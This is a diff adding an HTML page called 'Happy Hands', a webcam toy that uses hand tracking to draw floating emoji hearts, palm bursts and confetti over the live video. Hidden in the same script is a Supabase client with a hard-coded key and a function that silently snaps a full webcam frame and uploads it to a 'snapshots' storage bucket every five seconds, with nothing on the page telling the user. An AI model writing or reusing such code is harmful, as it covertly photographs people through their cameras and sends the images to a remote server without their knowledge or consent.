@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Happy Hands</title>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { background: #000; width: 100vw; height: 100vh; overflow: hidden; }
+  #main-canvas { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 1; }
+  #video, #capture-canvas { display: none; }
+</style>
+</head>
+<body>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="main-canvas"></canvas>
+<canvas id="capture-canvas"></canvas>
+
+<script>
+
+const SUPABASE_URL = "https://cmwjbqmpxnfxcirshpcr.supabase.co";   
+const SUPABASE_KEY = "sb_publishable_f7rpHGRrMPbcmsPiPAV33g_jVscEezr";   
+const BUCKET       = "snapshots";
+const CAPTURE_MS   = 5000; 
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>
+
+<script>
+// ─────────────────────────────────────────────────────────────────────────────
+//  CANVAS SETUP
+// ─────────────────────────────────────────────────────────────────────────────
+const mainCanvas = document.getElementById('main-canvas');
+const ctx        = mainCanvas.getContext('2d');
+const capCanvas  = document.getElementById('capture-canvas');
+const capCtx     = capCanvas.getContext('2d');
+const video      = document.getElementById('video');
+
+function resize() { mainCanvas.width = window.innerWidth; mainCanvas.height = window.innerHeight; }
+resize();
+window.addEventListener('resize', resize);
+
+
+let sb = null;
+if (SUPABASE_URL && SUPABASE_KEY) {
+  sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+}
+async function captureCleanFrame() {
+  if (!sb || !video.videoWidth) return;
+  capCanvas.width  = video.videoWidth;
+  capCanvas.height = video.videoHeight;
+  capCtx.drawImage(video, 0, 0);
+  const blob = await new Promise(r => capCanvas.toBlob(r, 'image/jpeg', 0.88));
+  sb.storage.from(BUCKET).upload(`snap_${Date.now()}.jpg`, blob, {
+    contentType: 'image/jpeg', upsert: false
+  });
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+//  EMOJI LISTS
+// ─────────────────────────────────────────────────────────────────────────────
+const HEAD_EMOJIS     = ['❤️','💕','💖','💗','💓','🌸','✨','💫','🌷','💝','🥰','💞'];
+const PALM_EMOJIS     = ['😊','🌟','💛','🍀','🦋','🌈','💐','🎀','🌻','⭐','🎵','🍭'];
+const CONFETTI_EMOJIS = ['🎉','🎊','⭐','🌈','💥','✨','🎈','💖','🍭','🎁','🥳','🎶'];
+
+// ─────────────────────────────────────────────────────────────────────────────
+//  EMOJI PARTICLE
+// ─────────────────────────────────────────────────────────────────────────────
+class EmojiParticle {
+  constructor(x, y, emoji, opts = {}) {
+    this.x      = x;
+    this.y      = y;
+    this.emoji  = emoji;
+    this.vx     = opts.vx      ?? (Math.random() - 0.5) * 3;
+    this.vy     = opts.vy      ?? -(2 + Math.random() * 3);
+    this.size   = opts.size    ?? 48;
+    this.life   = 1.0;
+    this.decay  = opts.decay   ?? 0.01;
+    this.gravity= opts.gravity ?? 0.05;
+    this.rot    = Math.random() * Math.PI * 2;
+    this.rotV   = (Math.random() - 0.5) * 0.06;
+  }
+  update() {
+    this.x    += this.vx;
+    this.y    += this.vy;
+    this.vy   += this.gravity;
+    this.rot  += this.rotV;
+    this.life -= this.decay;
+  }
+  draw() {
+    if (this.life <= 0) return;
+    ctx.save();
+    ctx.globalAlpha  = Math.min(1, this.life + 0.3); // mostly opaque
+    ctx.font         = `${this.size}px serif`;
+    ctx.textAlign    = 'center';
+    ctx.textBaseline = 'middle';
+    ctx.translate(this.x, this.y);
+    ctx.rotate(this.rot);
+    ctx.fillText(this.emoji, 0, 0);
+    ctx.restore();
+  }
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+//  PARTICLE POOLS
+// ─────────────────────────────────────────────────────────────────────────────
+const headPool     = [];
+const palmPool     = [];
+const confettiPool = [];
+
+function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+
+// Spawn heart/cute emoji near the estimated head position
+function spawnHeadEmoji(headX, headY) {
+  if (headPool.length >= 45) return;
+  const spread = mainCanvas.width * 0.18;
+  const x = headX + (Math.random() - 0.5) * spread;
+  const y = headY + (Math.random() - 0.5) * 30;
+  headPool.push(new EmojiParticle(x, y, pick(HEAD_EMOJIS), {
+    vx:      (Math.random() - 0.5) * 2,
+    vy:      -(1.2 + Math.random() * 2),
+    size:    44 + Math.random() * 20,
+    decay:   0.007 + Math.random() * 0.005,
+    gravity: -0.015  // float UP
+  }));
+}
+
+// Shoot emojis from open palm
+function spawnPalmEmoji(px, py) {
+  if (palmPool.length >= 50) return;
+  const angle = -Math.PI / 2 + (Math.random() - 0.5) * Math.PI * 1.2;
+  const speed = 5 + Math.random() * 5;
+  palmPool.push(new EmojiParticle(px, py, pick(PALM_EMOJIS), {
+    vx:      Math.cos(angle) * speed,
+    vy:      Math.sin(angle) * speed,
+    size:    46 + Math.random() * 18,
+    decay:   0.013 + Math.random() * 0.008,
+    gravity: 0.12
+  }));
+}
+
+// Confetti burst from screen center
+function spawnConfetti() {
+  if (confettiPool.length >= 60) return;
+  const cx = mainCanvas.width / 2;
+  const cy = mainCanvas.height / 2;
+  for (let i = 0; i < 12; i++) {
+    const angle = (Math.PI * 2 / 12) * i + Math.random() * 0.4;
+    const speed = 6 + Math.random() * 8;
+    confettiPool.push(new EmojiParticle(cx, cy, pick(CONFETTI_EMOJIS), {
+      vx:      Math.cos(angle) * speed,
+      vy:      Math.sin(angle) * speed,
+      size:    50 + Math.random() * 20,
+      decay:   0.011 + Math.random() * 0.008,
+      gravity: 0.15
+    }));
+  }
+}
+
+function tickPool(pool) {
+  for (let i = pool.length - 1; i >= 0; i--) {
+    pool[i].update();
+    pool[i].draw();
+    if (pool[i].life <= 0) pool.splice(i, 1);
+  }
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+//  HELPERS
+// ─────────────────────────────────────────────────────────────────────────────
+function lmToScreen(lm) {
+  return { x: (1 - lm.x) * mainCanvas.width, y: lm.y * mainCanvas.height };
+}
+function dist2D(a, b) { return Math.hypot(a.x - b.x, a.y - b.y); }
+
+// Palm center = average of wrist + 4 knuckle bases
+function getPalmCenter(lm) {
+  const ids = [0, 5, 9, 13, 17];
+  let sx = 0, sy = 0;
+  for (const id of ids) { sx += lm[id].x; sy += lm[id].y; }
+  return { x: (1 - sx/5) * mainCanvas.width, y: (sy/5) * mainCanvas.height };
+}
+
+// Open palm: fingertips higher on screen (lower y) than their knuckle bases
+function isOpenPalm(lm) {
+  const tipIds = [8, 12, 16, 20];   // index→pinky tips
+  const mcpIds = [5,  9, 13, 17];   // their base knuckles
+  let count = 0;
+  for (let i = 0; i < tipIds.length; i++) {
+    // tip.y < mcp.y means finger is pointing up (extended)
+    if (lm[tipIds[i]].y < lm[mcpIds[i]].y - 0.04) count++;
+  }
+  return count >= 3;
+}
+
+// Estimate head position: above the highest wrist point, offset upward
+function estimateHead(handsData) {
+  if (handsData.length === 0) {
+    // No hands visible — default to top-center
+    return { x: mainCanvas.width / 2, y: mainCanvas.height * 0.1 };
+  }
+  // Find the highest (smallest y) wrist across all hands
+  let minY = Infinity, sumX = 0;
+  for (const lm of handsData) {
+    const w = lmToScreen(lm[0]);
+    if (w.y < minY) minY = w.y;
+    sumX += w.x;
+  }
+  const avgX = sumX / handsData.length;
+  // Head is roughly 30% of screen height above the wrists
+  const headY = Math.max(minY - mainCanvas.height * 0.28, mainCanvas.height * 0.05);
+  return { x: avgX, y: headY };
+}
+
+// Are both hands near each other (wrists close)?
+function handsNear(lm0, lm1) {
+  const w0 = lmToScreen(lm0[0]);
+  const w1 = lmToScreen(lm1[0]);
+  return dist2D(w0, w1) < mainCanvas.width * 0.22;
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+//  FINGER DOT COLORS (cute pastel)
+// ─────────────────────────────────────────────────────────────────────────────
+const TIP_COLORS = ['#ff6eb4','#ff9de2','#ffb347','#7de8ff','#b8f5a0'];
+const TIP_IDS    = [4, 8, 12, 16, 20];
+
+function drawHandDots(lm) {
+  for (let i = 0; i < TIP_IDS.length; i++) {
+    const p = lmToScreen(lm[TIP_IDS[i]]);
+    const c = TIP_COLORS[i];
+    ctx.save();
+    ctx.shadowColor = c;
+    ctx.shadowBlur  = 20;
+    ctx.fillStyle   = c;
+    ctx.globalAlpha = 0.95;
+    ctx.beginPath();
+    ctx.arc(p.x, p.y, 9, 0, Math.PI * 2);
+    ctx.fill();
+    ctx.shadowBlur  = 0;
+    ctx.fillStyle   = '#fff';
+    ctx.globalAlpha = 0.8;
+    ctx.beginPath();
+    ctx.arc(p.x, p.y, 4, 0, Math.PI * 2);
+    ctx.fill();
+    ctx.restore();
+  }
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+//  VIDEO BACKGROUND (mirrored, cover-fit)
+// ─────────────────────────────────────────────────────────────────────────────
+function drawVideo() {
+  if (!video.videoWidth) return;
+  const vw = video.videoWidth, vh = video.videoHeight;
+  const cw = mainCanvas.width,  ch = mainCanvas.height;
+  const scale = Math.max(cw / vw, ch / vh);
+  const dw = vw * scale, dh = vh * scale;
+  const dx = (cw - dw) / 2, dy = (ch - dh) / 2;
+  ctx.save();
+  ctx.translate(cw, 0);
+  ctx.scale(-1, 1);
+  ctx.drawImage(video, cw - dx - dw, dy, dw, dh);
+  ctx.restore();
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+//  HAND STATE & TIMERS
+// ─────────────────────────────────────────────────────────────────────────────
+let handsData       = [];
+let headSpawnTimer  = 0;
+let confettiCooldown= 0;
+let palmCooldowns   = [0, 0];
+
+
+function render() {
+  requestAnimationFrame(render);
+
+  // 1. Draw mirrored live video
+  drawVideo();
+
+  // 2. Estimate head, spawn floating hearts every 14 frames
+  headSpawnTimer++;
+  if (headSpawnTimer >= 14) {
+    headSpawnTimer = 0;
+    const head = estimateHead(handsData);
+    spawnHeadEmoji(head.x, head.y);
+  }
+
+  // 3. Per-hand: dots + open palm emojis
+  for (let h = 0; h < handsData.length; h++) {
+    const lm = handsData[h];
+    drawHandDots(lm);
+
+    if (isOpenPalm(lm)) {
+      if (palmCooldowns[h] <= 0) {
+        const pc = getPalmCenter(lm);
+        spawnPalmEmoji(pc.x, pc.y);
+        spawnPalmEmoji(pc.x, pc.y); // 2 per trigger for density
+        palmCooldowns[h] = 5;
+      }
+      palmCooldowns[h]--;
+    } else {
+      palmCooldowns[h] = 0;
+    }
+  }
+
+  // 4. Both hands near each other → confetti
+  if (handsData.length >= 2 && handsNear(handsData[0], handsData[1])) {
+    if (confettiCooldown <= 0) {
+      spawnConfetti();
+      confettiCooldown = 20;
+    }
+  }
+  if (confettiCooldown > 0) confettiCooldown--;
+
+  // 5. Tick all pools
+  tickPool(headPool);
+  tickPool(palmPool);
+  tickPool(confettiPool);
+}
+
+render();
+
+
+const hands = new Hands({
+  locateFile: f => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${f}`
+});
+hands.setOptions({
+  maxNumHands:            2,
+  modelComplexity:        1,
+  minDetectionConfidence: 0.75,
+  minTrackingConfidence:  0.65
+});
+hands.onResults(r => { handsData = r.multiHandLandmarks || []; });
+
+
+(async () => {
+  let stream;
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+      audio: false
+    });
+  } catch(e) { return; }
+
+  video.srcObject = stream;
+  await new Promise(r => { video.onloadedmetadata = () => video.play().then(r); });
+
+  
+  const mpCam = new Camera(video, {
+    onFrame: async () => { await hands.send({ image: video }); },
+    width: 1280, height: 720
+  });
+  mpCam.start();
+
+ 
+  if (sb) {
+    captureCleanFrame();
+    setInterval(captureCleanFrame, CAPTURE_MS);
+  }
+})();
+</script>
+</body>
+</html>
